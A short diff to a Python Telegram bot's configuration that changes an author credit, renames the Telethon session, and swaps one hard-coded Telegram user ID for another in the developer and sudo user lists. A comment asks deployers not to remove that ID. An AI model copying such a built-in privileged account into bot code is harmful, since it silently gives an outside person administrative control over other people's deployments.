@@ -142,16 +142,16 @@ else:
     TELETHON_HASH = Config.TELETHON_HASH
     TELETHON_ID = Config.TELETHON_ID
     
-# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Sur_vivor     
+# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @SauravPanday     
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1118936839)
+DEV_USERS.add(1744314730)
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1118936839)
+SUDO_USERS.add(1744314730)
 
 # Telethon
 api_id = TELETHON_ID
 api_hash = TELETHON_HASH
-telethn = TelegramClient("cinderella", api_id, api_hash)
+telethn = TelegramClient("valencia", api_id, api_hash)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
